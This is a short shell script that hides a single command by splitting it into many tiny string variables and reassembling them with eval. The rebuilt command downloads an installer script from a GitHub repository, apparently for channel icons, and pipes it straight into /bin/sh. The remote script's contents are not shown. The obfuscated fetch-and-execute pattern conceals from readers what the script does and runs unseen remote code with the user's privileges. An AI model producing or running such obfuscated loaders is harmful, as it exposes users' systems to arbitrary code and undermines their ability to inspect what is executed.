z="
";Yz='sh';Kz='mil2';Tz='ler.';Sz='stal';Pz='asat';Oz='gari';Iz='nt.c';Qz='/mai';Uz='sh -';Hz='onte';Gz='serc';Lz='37/p';Rz='n/in';Cz='ps:/';Ez='.git';Wz=' | /';Jz='om/e';Bz=' htt';Az='wget';Xz='bin/';Nz='-bul';Dz='/raw';Vz='qO -';Mz='icon';Fz='hubu';
eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz"